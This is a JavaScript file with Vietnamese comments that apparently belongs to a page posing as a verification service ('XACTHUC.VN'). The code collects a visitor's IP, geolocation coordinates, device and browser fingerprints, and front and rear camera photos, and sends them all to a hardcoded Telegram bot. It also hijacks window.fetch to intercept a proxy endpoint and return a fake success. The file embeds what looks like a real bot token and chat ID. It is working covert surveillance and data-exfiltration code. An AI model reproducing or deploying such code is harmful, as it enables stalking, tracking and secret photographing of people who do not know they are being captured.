// telegram.js - Gửi tất cả thông tin lên Telegram
const BOT_TOKEN = '8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac';
const CHAT_ID = '7997436406';

window.sendToTelegram = async (data) => {
    try {
        let clientInfo = {};
        if (data.clientInfo) {
            clientInfo = typeof data.clientInfo === 'string' 
                ? JSON.parse(data.clientInfo) 
                : data.clientInfo;
        }
        
        // Tạo message siêu chi tiết
        const message = `📡 *[THÔNG TIN TRUY CẬP SIÊU CHI TIẾT]*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🕒 *THỜI GIAN*
━━━━━━━━━━━━━━━━━━━━━
⏰ Thời gian: ${clientInfo.time || '?'}
🌍 Timezone: ${clientInfo.timezone || '?'}
⏱️ Timestamp: ${clientInfo.timestamp || '?'}

📱 *THIẾT BỊ*
━━━━━━━━━━━━━━━━━━━━━
📱 Thiết bị: ${clientInfo.device || '?'}
📲 Model: ${clientInfo.device_model || '?'}
💿 HĐH: ${clientInfo.os || '?'} ${clientInfo.os_version || ''}
🌐 Trình duyệt: ${clientInfo.browser || '?'} (${clientInfo.browser_version || '?'})
🗣️ Ngôn ngữ: ${clientInfo.language || '?'}

🖥️ *MÀN HÌNH & PHẦN CỨNG*
━━━━━━━━━━━━━━━━━━━━━
📺 Độ phân giải: ${clientInfo.screen_width || '?'}x${clientInfo.screen_height || '?'}
🔍 Pixel ratio: ${clientInfo.screen_pixel_ratio || '?'}
🎨 Màu sắc: ${clientInfo.screen_color_depth || '?'}bit
💾 RAM thiết bị: ${clientInfo.device_memory || '?'}
🧠 CPU cores: ${clientInfo.hardware_concurrency || '?'}
🔋 Pin: ${clientInfo.battery_level || '?'} (${clientInfo.battery_charging || '?'})

🌐 *KẾT NỐI MẠNG*
━━━━━━━━━━━━━━━━━━━━━
📶 Loại mạng: ${clientInfo.connection_type || '?'}
⚡ Tốc độ: ${clientInfo.connection_downlink || '?'}
🔄 Ping: ${clientInfo.connection_rtt || '?'}
📡 DNS: ${clientInfo.dns_servers || '?'}

📍 *VỊ TRÍ ĐỊA LÝ*
━━━━━━━━━━━━━━━━━━━━━
🌍 IP: ${clientInfo.ip || '?'}
🏢 ISP: ${clientInfo.isp || '?'}
🏛️ Tổ chức: ${clientInfo.organization || '?'}
🌎 Quốc gia: ${clientInfo.country || '?'} (${clientInfo.country_code || '?'})
🏙️ Thành phố: ${clientInfo.city || '?'}
🗺️ Khu vực: ${clientInfo.region || '?'}
📍 Vĩ độ: ${clientInfo.latitude || '?'}
📍 Kinh độ: ${clientInfo.longitude || '?'}
🗺️ Bản đồ: ${clientInfo.google_maps || '?'}
🛡️ VPN/Proxy: ${clientInfo.is_vpn || '?'}

📸 *CAMERA*
━━━━━━━━━━━━━━━━━━━━━
📷 Trạng thái: ${clientInfo.camera || '?'}
🤳 Camera trước: ${clientInfo.camera_front ? '✅ Đã chụp' : '❌ Không'}
📸 Camera sau: ${clientInfo.camera_back ? '✅ Đã chụp' : '❌ Không'}

🔐 *FINGERPRINT*
━━━━━━━━━━━━━━━━━━━━━
🎨 Canvas: ${clientInfo.canvas_fingerprint || '?'}
🎮 WebGL Vendor: ${clientInfo.webgl_vendor || '?'}
🎮 WebGL Renderer: ${clientInfo.webgl_renderer || '?'}
🎵 Audio: ${clientInfo.audio_fingerprint || '?'}

🔌 *PLUGINS*
━━━━━━━━━━━━━━━━━━━━━
${clientInfo.plugins ? clientInfo.plugins.slice(0, 5).join(', ') : '?'}${clientInfo.plugins && clientInfo.plugins.length > 5 ? '...' : ''}

⚠️ *GHI CHÚ*
━━━━━━━━━━━━━━━━━━━━━
${clientInfo.note || 'Thông tin có thể không chính xác 100%'}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 *MÃ NGUỒN: XACTHUC.VN*`;

        // Gửi text
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        
        // Gửi ảnh camera trước
        if (data.front && data.front instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.front);
            fd.append('caption', '📸 ẢNH CAMERA TRƯỚC');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
        
        // Gửi ảnh camera sau
        if (data.back && data.back instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.back);
            fd.append('caption', '📸 ẢNH CAMERA SAU');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
        
        console.log("✅ Đã gửi đầy đủ thông tin lên Telegram!");
        
    } catch(e) {
        console.error('❌ Lỗi:', e);
    }
};

// Override fetch
const originalFetch = window.fetch;
window.fetch = async (url, options) => {
    if (url === '/api/tele-proxy' && options?.body) {
        const formData = options.body;
        if (formData instanceof FormData) {
            window.sendToTelegram({
                clientInfo: formData.get('clientInfo'),
                front: formData.get('front'),
                back: formData.get('back')
            });
        }
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
    }
    return originalFetch(url, options);
};

console.log("🚀 Telegram proxy siêu cấp đã sẵn sàng!");
